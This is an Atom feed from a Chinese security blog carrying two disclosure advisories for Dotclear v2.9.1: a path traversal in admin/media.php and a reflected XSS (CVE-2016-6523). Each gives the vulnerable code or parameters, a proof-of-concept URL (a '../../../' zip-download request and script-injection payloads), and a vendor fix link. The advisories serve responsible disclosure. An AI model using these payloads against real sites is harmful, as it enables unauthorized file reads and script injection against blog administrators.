<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

 <title>储藏间</title>
 <link href="http://localhost:4000/atom.xml" rel="self"/>
 <link href="http://localhost:4000/"/>
 <updated>2016-12-27T15:40:08+08:00</updated>
 <id>http://localhost:4000</id>
 <author>
   <name>kevinoclam</name>
   <email></email>
 </author>

 
 <entry>
   <title>Dotclear v2.9.1 路径遍历</title>
   <link href="http://localhost:4000/2016/12/27/dotclear-path_travel/"/>
   <updated>2016-12-27T00:00:00+08:00</updated>
   <id>http://localhost:4000/2016/12/27/dotclear-path_travel</id>
   <content type="html">&lt;p&gt;发现者: 陈瑞琦&lt;/p&gt;

&lt;p&gt;发现日期: 2016-08-01&lt;/p&gt;

&lt;p&gt;下载地址: &lt;a href=&quot;https://dotclear.org/download&quot;&gt;dotclear&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;作者: dotclear.org&lt;/p&gt;

&lt;p&gt;作者通知日期: 2016-08-01&lt;/p&gt;

&lt;p&gt;作者联系手段: security@dotclear.net&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;描述:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Dotclear is an open source blog publishing application distributed under the GNU GPLv2. Developed originally by Olivier Meunier from 2002, Dotclear has now attracted a solid team of developers.[2] It is relatively popular in French speaking countries, where it is used by several major blogging platforms (Gandi Blogs,[3] Marine nationale,[4] etc.).(Wiki)&lt;/p&gt;

&lt;p&gt;&lt;em&gt;渣翻&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Dotclear是一个基于GUN GPLv2的开源博客发布应用。在2002年由Olivier Meunier开发，现在已经吸引了一大个开发团队。在法语国家非常流行，并且为几个大型博客平台所用。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;细节:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;在media.php这儿有个路径遍历问题&lt;/p&gt;

&lt;p&gt;/admin/media.php&lt;/p&gt;

&lt;p&gt;line 172 ~ line193&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;code&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;
if (!empty($_GET['zipdl']) &amp;amp;&amp;amp; $core-&amp;gt;auth-&amp;gt;check('media_admin',$core-&amp;gt;blog-&amp;gt;id))
{
	try
	{
		@set_time_limit(300);
		$fp = fopen('php://output','wb');
		$zip = new fileZip($fp);
		$zip-&amp;gt;addExclusion('#(^|/).(.*?)_(m|s|sq|t).jpg$#');
		$zip-&amp;gt;addDirectory($core-&amp;gt;media-&amp;gt;root.'/'.$d,'',true);

		header('Content-Disposition: attachment;filename='.date('Y-m-d').'-'.$core-&amp;gt;blog-&amp;gt;id.'-'.($d ? $d : 'media').'.zip');
		header('Content-Type: application/x-zip');
		$zip-&amp;gt;write();
		unset($zip);
		exit;
	}
	catch (Exception $e)
	{
		$core-&amp;gt;error-&amp;gt;add($e-&amp;gt;getMessage());
	}
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在参数$d这儿少了过滤，”../”应该删掉&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;PoC&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;http://192.168.204.130/dotclear/admin/media.php?popup=0&amp;amp;select=0&amp;amp;zipdl=1&amp;amp;d=../../../&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Fix&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;https://hg.dotclear.org/dotclear/rev/282b26727770&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Dotclear v2.9.1反射型xss</title>
   <link href="http://localhost:4000/2016/12/26/dotclear-xss/"/>
   <updated>2016-12-26T00:00:00+08:00</updated>
   <id>http://localhost:4000/2016/12/26/dotclear-xss</id>
   <content type="html">&lt;p&gt;发现者: 陈瑞琦&lt;/p&gt;

&lt;p&gt;发现日期: 2016-08-01&lt;/p&gt;

&lt;p&gt;下载地址: &lt;a href=&quot;https://dotclear.org/download&quot;&gt;dotclear&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;作者: dotclear.org&lt;/p&gt;

&lt;p&gt;作者通知日期: 2016-08-01&lt;/p&gt;

&lt;p&gt;作者联系手段: security@dotclear.net&lt;/p&gt;

&lt;p&gt;CVE ID: CVE-2016-6523&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;描述:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Dotclear is an open source blog publishing application distributed under the GNU GPLv2. Developed originally by Olivier Meunier from 2002, Dotclear has now attracted a solid team of developers.[2] It is relatively popular in French speaking countries, where it is used by several major blogging platforms (Gandi Blogs,[3] Marine nationale,[4] etc.).(Wiki)&lt;/p&gt;

&lt;p&gt;&lt;em&gt;渣翻&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Dotclear是一个基于GUN GPLv2的开源博客发布应用。在2002年由Olivier Meunier开发，现在已经吸引了一大个开发团队。在法语国家非常流行，并且为几个大型博客平台所用。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;细节:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Dotclear v2.9.1 有一个反射型xss&lt;/p&gt;

&lt;p&gt;/admin/media.php&lt;/p&gt;

&lt;p&gt;line 34 $link_type = !empty($_REQUEST[‘link_type’]) ? $_REQUEST[‘link_type’] : null;&lt;/p&gt;

&lt;p&gt;line 62 $q = isset($_REQUEST[‘q’]) ? $_REQUEST[‘q’] : null;&lt;/p&gt;

&lt;p&gt;link_type 跟 q 参数缺少安全过滤&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;PoC:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;http://172.16.146.130/dotclear/admin/media.php?q=77777%3C%2Fspan%3E%3Cscript%3Ealert(1)%3C/script%3E&amp;amp;popup=0&amp;amp;select=0&amp;amp;plugin_id=&amp;amp;post_id=&amp;amp;link_type=&lt;/p&gt;

&lt;p&gt;http://172.16.146.130/dotclear/admin/media.php?q=77777&amp;amp;popup=0&amp;amp;select=0&amp;amp;plugin_id=&amp;amp;post_id=&amp;amp;link_type=8888%22%3E%3Cscript%3Ealert(1)%3C/script%3E&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;修复方案:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;https://hg.dotclear.org/dotclear/rev/40d0207e520d&lt;/p&gt;
</content>
 </entry>
 

</feed>
